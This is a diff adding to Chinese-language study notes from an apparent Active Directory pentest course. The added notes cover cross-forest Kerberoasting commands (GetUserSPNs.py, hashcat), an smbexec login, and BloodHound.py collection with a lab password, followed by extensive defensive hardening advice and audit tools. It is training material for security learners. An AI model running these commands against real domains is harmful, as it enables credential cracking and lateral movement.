@@ -95,7 +95,7 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 
 
 跨林攻击Windows
-C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName      枚举SPN账户
+C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName      枚举 SPN 账户
 C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof      枚举 mssqlsvc 账户
 C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap            跨林攻击
 hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
@@ -106,4 +106,115 @@ C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Cr
 如果一个用户从一个林迁移到另一个林，并且没有启用 SID 筛选 (SID Filtering)，那么就有可能添加来自另一个林的 SID，而这个 SID 在跨信任进行身份验证时会被添加到用户的令牌 (token) 中
 
 跨林攻击Linux
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley      枚举 SPN 账户
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley        -request 获得TGS票据
+  添加 -outputfile <OUTPUT FILE> 将其直接输出到一个文件中
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+smbexec.py freightlogistics/sapsso@freightlogistics.local      用明文登录目标
+
+使用 BloodHound 的 Python 实现 来收集这些信息
+  https://github.com/dirkjanm/BloodHound.py
+在一台没有配置域内 DNS 的攻击主机上。在这种情况下，需要编辑我们的 resolv.conf 文件
+echo 'domain INLANEFREIGHT.LOCAL' >> /etc/resolv.conf
+echo 'nameserver 172.16.5.5' >> /etc/resolv.conf
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2      
+zip -r ilfreight_bh.zip *.json      单独的 zip 文件上传到 BloodHound GUI 中
+
+
+
+防御
+需要记录和跟踪的事项
+  OU (组织单位)、计算机、用户、组的命名约定
+  DNS、网络和 DHCP 配置
+  对所有 GPO (组策略对象) 及其应用对象的深入了解
+  FSMO 角色的分配
+  完整且最新的应用程序清单
+  所有企业主机及其位置的列表
+  我们与其他域或外部实体建立的任何信任关系
+  拥有提升权限的用户
+
+以下措施是开始保护 AD 环境中“人”这一要素的好方法。
+  组织应有强大的密码策略，并配备密码过滤器，禁止使用常见词语（例如：welcome、password、月份/星期/季节的名称以及公司名称）。如果可能，应使用企业级密码管理器来帮助用户选择和使用复杂密码。
+  定期轮换所有服务账户的密码。
+  禁止在用户工作站上使用本地管理员访问权限，除非存在特定的业务需求。
+  禁用默认的 RID-500 本地管理员账户，并创建一个新的管理员账户用于管理，该账户受 LAPS (本地管理员密码解决方案) 的密码轮换管理。
+  为管理员用户实施分层管理模型。在评估过程中，我们经常会在管理员用于所有工作活动的计算机上获得域管理员凭据。
+  清理特权组。组织是否需要 50 多个域/企业管理员？ 将高特权组的成员资格限制为仅那些需要此访问权限来执行其日常系统管理员职责的用户。
+  在适当的情况下，将账户放入 Protected Users 组。
+  禁用管理员账户的 Kerberos 委托（Protected Users 组可能不会这样做）。
+
+Protected Users 组，提供以下域控制器和设备保护：
+  组成员不能被赋予约束或非约束委托。
+  即使在组策略中设置了“允许委派默认凭据”，CredSSP (凭据安全支持提供程序) 也不会在内存中缓存明文凭据。
+  即使启用了 Windows 摘要式身份验证，Windows 摘要式身份验证也不会缓存用户的明文密码。
+  成员不能使用 NTLM 身份验证或使用 DES 或 RC4 密钥。
+  获取 TGT (票据授予票据) 后，用户的长期密钥或明文凭据不会被缓存。
+  成员不能续订超过原始 4 小时 TTL (生存时间) 的 TGT。
+  注意：`Protected Users` 组可能会导致意外的身份验证问题，这很容易导致账户锁定。一个组织绝不应在未经分阶段测试的情况下，将所有特权用户都放入此组。
+
+流程、策略和程序
+  适当的 AD 资产管理策略和程序。
+  AD 主机审计、资产标签的使用以及定期的资产盘点可以帮助确保主机不会丢失。
+  访问控制策略（用户账户的开通/停用）、多因素认证 (MFA) 机制。
+  主机配置和退役的流程（例如，基线安全加固指南、黄金镜像）。
+  AD 清理策略
+  前员工的账户是被删除还是仅仅被禁用？
+  从 AD 中删除过期记录的流程是什么？
+  退役旧版操作系统/服务的流程（例如，迁移到 O365 时正确卸载 Exchange）。
+  用户、组和主机的审计计划。
+
+工具或应用程序的漏洞
+  定期运行 BloodHound、PingCastle 和 Grouper 等工具来识别 AD 错误配置。
+  确保管理员不会将密码存储在 AD 账户的描述字段中。
+  审查 SYSVOL 中是否含有包含密码和其他敏感数据的脚本。
+  避免使用“普通”服务账户，尽可能使用组托管服务账户 (gMSA) 和托管服务账户 (MSA) 来降低 Kerberoasting 攻击的风险。
+  尽可能禁用非约束性委托 (Unconstrained Delegation)。
+  通过使用加固的跳板机 (jump host) 来防止直接访问域控制器。
+  考虑将 ms-DS-MachineAccountQuota 属性设置为 0，这会禁止用户添加机器账户，并可以防止多种攻击，如 noPac 攻击和基于资源的约束性委托 (RBCD)。
+  尽可能禁用打印后台处理程序服务，以防止多种攻击。
+  如果可能，为域控制器禁用 NTLM 身份验证。
+  使用身份验证扩展保护，并启用“仅要求 SSL”以仅允许对证书颁发机构 Web 注册和证书注册 Web 服务使用 HTTPS 连接。
+  启用 SMB 签名和 LDAP 签名。
+  采取措施防止使用 BloodHound 等工具进行枚举。
+  理想情况下，应每季度进行一次渗透测试/AD 安全评估，但如果预算有限，至少应每年进行一次。
+  测试备份的有效性，并审查/演练灾难恢复计划。
+  启用对匿名访问的限制，并通过将 RestrictNullSessAccess 注册表项设置为 1 来防止空会话枚举，以限制未经身份验证的用户的空会话访问。
+
+MITRE 标签将控制措施关联起来
+  https://attack.mitre.org/tactics/enterprise/
+
+
+AD Explorer 是 Sysinternal Suite 的一部分，其描述如下：
+  https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer
+一款 Active Directory (AD) 查看器和编辑器
+可以使用 AD Explorer 轻松浏览 AD 数据库、定义常用位置、查看对象属性和特性而无需打开对话框、编辑权限、查看对象架构以及执行可以保存和重新执行的复杂搜索
+可以用于保存 AD 数据库的快照 (snapshot)，以供离线查看和比较
+可以在某个时间点对 AD 进行快照，并在报告阶段稍后进行探索，就像探索任何其他数据库一样
+还可以用于对 AD 进行前后比较，以发现对象、属性和安全权限的变化
+
+PingCastle 
+  https://www.pingcastle.com/documentation/
+可以评估 AD 环境的安全态势 (security posture)，并以多种不同的地图和图表形式向我们提供结果
+在企业中，以用户易读的域地图形式收集一个活跃的主机清单 (inventory)
+PingCastle 与 PowerView 和 BloodHound 等工具不同
+除了攻击的枚举数据 (enumeration data) 
+还使用基于风险评估/成熟度框架 (risk assessment/maturity framework) 的方法，提供目标域安全级别的详细报告
+报告中显示的分数基于能力成熟度模型集成 (Capability Maturity Model Integration, CMMI)
+
+C:\htb> PingCastle.exe --help      查看帮助
+要运行 PingCastle，在 CMD 或 PowerShell 窗口中输入 PingCastle.exe
+默认选项是 healthcheck（健康检查）运行，它将建立域的基线概览，提供与配置错误和漏洞相关的相关信息
+在整个报告中，有诸如域、用户、组和信任信息等部分，还有一个专门的表格指出“异常”或可能需要立即关注的问题
+
+Group3r
+一款专门为发现 Active Directory 相关组策略中的漏洞而构建的工具
+必须从已加入域的主机 (domain-joined host) 上以域用户身份运行（无需是管理员），或在域用户上下文中运行（例如，使用 runas /netonly）
+C:\htb> group3r.exe -f <filepath-name.log> 
+
+ADRecon
+可用于一次性从 AD 中收集大量数据，在不需要隐秘行动的评估中，分析其结果也是值得的，以防所有的枚举都遗漏了一些可能有用或值得向客户指出的微小细节
+C:\htb> .\ADRecon.ps1
+完成后，执行的目录下会创建一个新文件夹，并将报告放入其中
+将获得一个 HTML 格式的报告和一个包含 CSV 结果的文件夹
+生成报告时需要安装 Excel 程序，否则脚本不会自动生成该格式的报
 
